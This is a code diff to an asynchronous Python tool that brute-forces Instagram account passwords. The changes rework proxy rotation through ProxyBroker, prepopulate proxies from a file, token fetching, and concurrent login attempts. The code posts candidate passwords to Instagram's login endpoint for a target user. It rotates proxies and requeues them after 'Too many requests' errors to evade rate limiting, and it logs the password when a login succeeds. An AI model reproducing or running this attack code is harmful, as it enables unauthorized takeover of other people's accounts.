@@ -7,13 +7,13 @@ from datetime import datetime
 import random
 from urllib.parse import urlparse
 
-from proxybroker.errors import NoProxyError
 import stopit
 
 from app import settings
 from app.lib import exceptions
-from app.logging import AppLogger, contextual_log
-from app.lib.utils import get_token_from_response
+from app.logging import AppLogger
+from app.lib.utils import (
+    get_token_from_response, limited_as_completed, read_proxies)
 
 from app.lib.models import (
     InstagramResult, LoginAttemptContext, LoginContext, TokenContext, Proxy)
@@ -34,10 +34,11 @@ class results_handler(handler):
 
     __name__ = 'Results Handler'
 
-    async def consume(self, loop):
+    async def consume(self, loop, stop_event):
 
         index = 0
-        while True:
+        while not stop_event.is_set():
+            self.log.info('Awaiting result')
             result = await self.results.get()
             if not result or not result.conclusive:
                 raise exceptions.FatalException(
@@ -47,17 +48,20 @@ class results_handler(handler):
             index += 1
             self.log.notice("{0:.2%}".format(float(index) / self.config.user.num_passwords))
             self.log.notice(result)
+
             if result.authorized:
                 self.log.notice(result)
                 self.log.notice(result.context.password)
-                return await self.engine.shutdown(loop)
+
+                stop_event.set()
+                return
+
             else:
                 self.log.error(result)
 
+            self.log.info('Awaiting putting in attmepts')
             await self.attempts.put(result.context.password)
-
-            # Notify the queue that the item has been processed
-            self.results.task_done()
+        self.log.info('Stop Event Noticed')
 
     async def dump(self):
         log = AppLogger('Dumping Password Attempts')
@@ -73,50 +77,118 @@ class results_handler(handler):
 class proxy_handler(handler):
 
     __name__ = 'Proxy Handler'
+    __urls__ = {
+        'GET': settings.INSTAGRAM_URL,
+        'POST': settings.INSTAGRAM_LOGIN_URL
+    }
 
-    def __init__(self, proxy_pool, *args):
+    def __init__(self, proxy_pool, *args, method='GET'):
         super(proxy_handler, self).__init__(*args)
+
+        self.method = method
         self.pool = proxy_pool
-        self.proxies = []
+        self.proxy_list = []
         self.proxies = asyncio.Queue()
+        self.scheme = urlparse(self.__urls__[method]).scheme
+
+    async def prepopulate(self):
+        """
+        When initially starting, it sometimes takes awhile for the proxies with
+        valid credentials to populate and kickstart the password consumer.
+
+        Prepopulating the proxies from the designated text file can help and
+        dramatically increase speeds.
+        """
+        proxies = read_proxies(method=self.method, order_by='avg_resp_time')
+        for proxy in proxies:
+            await self.put(proxy, update_time=False)
 
     async def consume(self, loop, stop_event):
         # Introduce timeout for waiting for first proxy.
-        while not stop_event.is_set():
-            proxy = await self.pool.get(
-                scheme=urlparse(settings.INSTAGRAM_URL).scheme)
-            proxy = Proxy.from_broker_proxy(proxy)
+        await self.prepopulate()
 
-            # Should we maybe check proxy verifications before we put the
-            # proxy in the queue to begin with?
-            await self.put(proxy, update_time=False)
+        while not stop_event.is_set():
+            try:
+                proxy = await self.pool.get(scheme=self.scheme)
+
+            # Weird error from ProxyBroker that makes no sense...
+            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
+            except TypeError as e:
+                self.log.warning(e)
+
+            else:
+                # self.log.info('Trying to add proxy...')
+                # self.log.info('Error Rate: %s, Avg Resp Time: %s' %
+                #     (proxy.error_rate, proxy.avg_resp_time))
+                proxy = Proxy.from_broker_proxy(proxy)
+                if proxy.error_rate <= 0.5 and proxy.avg_resp_time <= 5.0:
+                    # Should we maybe check proxy verifications before we put the
+                    # proxy in the queue to begin with?
+                    await self.put(proxy, update_time=False)
+
+        self.log.info('Stop Event Noticed')
 
     async def put(self, proxy, update_time=True):
         if update_time:
             proxy.last_used = datetime.now()
         await self.proxies.put(proxy)
+        # self.log.notice('Num Proxies %s' % self.proxies.qsize())
+        # self.proxy_list.append(proxy)
+
+    async def validate_proxy(self, proxy):
+        if not proxy.last_used:
+            return True
+        else:
+            if proxy.time_since_used() >= 10:
+                return True
+            else:
+                await self.proxies.put(proxy)
+                self.proxy_list.append(proxy)
+                return False
+
+    async def get_from_list(self):
+        while True:
+            # proxy = await self.proxies.get()
+            if len(self.proxy_list) == 0:
+                continue
+
+            proxy = self.proxy_list.pop(0)
+
+            # Should we maybe check these verifications before we put the
+            # proxy in the queue to begin with?
+            valid = await self.validate_proxy(proxy)
+            if valid:
+                return proxy
+
+    async def get_from_queue(self):
+        while True:
+            proxy = await self.proxies.get()
+
+            # Should we maybe check these verifications before we put the
+            # proxy in the queue to begin with?
+            valid = await self.validate_proxy(proxy)
+            if valid:
+                return proxy
 
     async def get(self):
         # TODO: Move the allowed timeout for finding a given proxy that satisfies
         # reauirements to settings.
-        with stopit.SignalTimeout(5) as timeout_mgr:
-            while True:
-                proxy = await self.proxies.get()
-
-                # Should we maybe check these verifications before we put the
-                # proxy in the queue to begin with?
-                if proxy.error_rate <= 0.5 and proxy.avg_resp_time <= 2.0:
-                    if not proxy.last_used:
-                        return proxy
-                    else:
-                        delta = datetime.now() - proxy.last_used
-                        if delta.total_seconds() >= 10:
-                            return proxy
-                        else:
-                            await self.put(proxy, update_time=False)
+        # We will set the timeout very high right now, because it sometimes takes
+        # awhile for the proxies to build up - setting this low causes it to fail
+        # during early stages of login attempts.
+        with stopit.SignalTimeout(50) as timeout_mgr:
+            proxy = await self.get_from_queue()
+            if proxy:
+                if proxy.time_since_used():
+                    self.log.notice('Returning Proxy %s Used %s Seconds Ago' %
+                        (proxy.host, proxy.time_since_used()))
 
         if timeout_mgr.state == timeout_mgr.TIMED_OUT:
             raise exceptions.InternalTimeout("Timed out waiting for a valid proxy.")
+
+        if not proxy:
+            raise Exception('ERROR')
+        return proxy
 
 
 class request_handler(handler):
@@ -173,16 +245,7 @@ class token_handler(request_handler):
         self.log.info(message, extra={'context': context})
 
     async def fetch(self, session):
-        """
-        TODO:
-        -----
 
-        Maybe incorporate some sort of max-retry on the attempts so that we dont
-        accidentally run into a situation of accumulating a lot of requests.
-
-        For certain exceptions we may want to reintroduce the sleep/timeout,
-        but it might be faster to immediately just go to next proxy.
-        """
         async def try_with_proxy(attempt=0):
 
             proxy = await self.proxy_handler.get()
@@ -207,6 +270,8 @@ class token_handler(request_handler):
                         await self.proxy_handler.put(proxy)
                         return token
 
+            # TODO: Might want to incorporate too many requests, although that
+            # is unlikely.
             except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                 return await try_with_proxy(attempt=attempt + 1)
 
@@ -217,28 +282,15 @@ class token_handler(request_handler):
             except asyncio.CancelledError:
                 return
 
-            except NoProxyError:
-                self.log.error('Waiting on proxies...')
-                asyncio.sleep(3)
-                return await try_with_proxy(attempt=attempt + 1)
-
             except (TimeoutError, asyncio.TimeoutError) as e:
                 self.log.error(e, extra={'context': context})
                 return await try_with_proxy(attempt=attempt + 1)
 
-            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
-            # Some error with proxybroker and how it is handling the Queue/ProxyPool.
-            except TypeError:
-                self.log.error('Having trouble putting proxy in queue.')
-                return await try_with_proxy(attempt=attempt + 1)
-
-        import time
-        time.sleep(3)
         # We might have to check if stop_event is set here.
         return await try_with_proxy()
 
     async def consume(self, loop, stop_event):
-        token = None
+
         while not stop_event.is_set():
             async with aiohttp.ClientSession(
                 connector=self.connector,
@@ -247,7 +299,7 @@ class token_handler(request_handler):
                 task = asyncio.ensure_future(self.fetch(session))
 
                 # TODO: Move the allowed timeout for finding the token to settings.
-                with stopit.SignalTimeout(1) as timeout_mgr:
+                with stopit.SignalTimeout(10) as timeout_mgr:
                     token = await task
                     if not token:
                         raise exceptions.FatalException("Token should be non-null here.")
@@ -255,16 +307,18 @@ class token_handler(request_handler):
                 if timeout_mgr.state == timeout_mgr.TIMED_OUT:
                     raise exceptions.InternalTimeout("Timed out waiting for token.")
                 stop_event.set()
-        return token
+
+                return token
 
 
 class password_handler(request_handler):
 
     __name__ = 'Login Handler'
 
-    def __init__(self, proxy_handler, *args):
+    def __init__(self, proxy_handler, passwords, *args):
         super(password_handler, self).__init__(*args)
         self.proxy_handler = proxy_handler
+        self.passwords = passwords
 
     def _login_data(self, password):
         return {
@@ -291,7 +345,6 @@ class password_handler(request_handler):
         else:
             return InstagramResult.from_dict(result, context)
 
-    @contextual_log
     async def _handle_client_response(self, response, context):
         """
         Takes the AIOHttp ClientResponse and tries to return a parsed
@@ -357,17 +410,17 @@ class password_handler(request_handler):
         but it might be faster to immediately just go to next proxy.
         """
         async def try_with_proxy(attempt=0):
-            try:
-                proxy = await self.proxy_handler.get()
-                context = LoginAttemptContext(
-                    index=attempt,
-                    proxy=proxy,
-                    parent_index=parent_context.index,
-                    password=parent_context.password,
-                    token=parent_context.token
-                )
-                self._notify_request(context, retry=attempt)
+            proxy = await self.proxy_handler.get()
+            context = LoginAttemptContext(
+                index=attempt,
+                proxy=proxy,
+                parent_index=parent_context.index,
+                password=parent_context.password,
+                token=parent_context.token
+            )
+            # self._notify_request(context, retry=attempt)
 
+            try:
                 async with session.post(
                     settings.INSTAGRAM_LOGIN_URL,
                     headers=self._headers(context.token),
@@ -388,6 +441,7 @@ class password_handler(request_handler):
                     else:
                         if not result:
                             raise exceptions.FatalException("Result should not be None here.")
+
                         await self.proxy_handler.put(proxy)
                         return result
 
@@ -426,24 +480,17 @@ class password_handler(request_handler):
                 else:
                     raise e
 
-            except NoProxyError:
-                self.log.error('Waiting on proxies...')
-                asyncio.sleep(3)
-                return await try_with_proxy(attempt=attempt + 1)
-
-            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
-            # Some error with proxybroker and how it is handling the Queue/ProxyPool.
-            except TypeError:
-                self.log.error('Having trouble putting proxy in queue.')
-                return await try_with_proxy(attempt=attempt + 1)
-
             except asyncio.CancelledError as e:
                 pass
 
             except aiohttp.ClientError as e:
                 # For whatever reason these errors don't have any message...
+                # We want to put the proxy back in the queue so it can be used
+                # again later.
                 if e.status == 429:
                     e.message = 'Too many requests.'
+                    await self.proxy_handler.put(proxy)
+
                 self.log.error(e, extra={'context': context})
                 return await try_with_proxy(attempt=attempt + 1)
 
@@ -466,14 +513,42 @@ class password_handler(request_handler):
             self.log.debug('Got Conclusive Result')
             return result
 
-    async def consume(self, loop, token):
-        async with aiohttp.ClientSession(
-            connector=self.connector,
-            timeout=self.timeout
-        ) as session:
-            for res in limited_as_completed(
-                (self.attempt_login(session, token, password, index=i)
-                for i, password in enumerate(self.config.user.get_new_attempts(
-                    limit=self.config.password_limit))), self.config.batch_size):
-                result = await res
-                await self.results.put(result)
+    async def produce(self, loop, stop_event):
+        for password in self.config.user.get_new_attempts(
+                limit=self.config.password_limit):
+            self.log.info('PUtting in pw %s' % password)
+            self.passwords.put_nowait(password)
+
+    async def consume(self, loop, stop_event, token, handle_results):
+        tasks = []
+
+        def task_done(result):
+            self.log.notice('Got Result %s' % result.result())
+            self.results.put_nowait(result.result())
+
+        while not stop_event.is_set():
+            async with aiohttp.ClientSession(
+                connector=self.connector,
+                timeout=self.timeout
+            ) as session:
+
+                index = 0
+                while not self.passwords.empty():
+                    pw = self.passwords.get_nowait()
+                    task = asyncio.create_task(self.attempt_login(session, token, pw, index=index))
+                    task.add_done_callback(task_done)
+                    tasks.append(task)
+                    # yield self.attempt_login(session, token, pw, index=index)
+
+                await asyncio.gather(*tasks)
+                stop_event.set()
+
+        self.log.info('Stop Event Noticed')
+        handle_results.consume.cancel()
+        # for fut in asyncio.as_completed(tasks):
+        #     fut = await fut
+        #     await self.results.put(fut)
+
+        # for res in limited_as_completed(task_generator(), self.config.batch_size):
+        #     result = await res
+        #     await self.results.put(result)
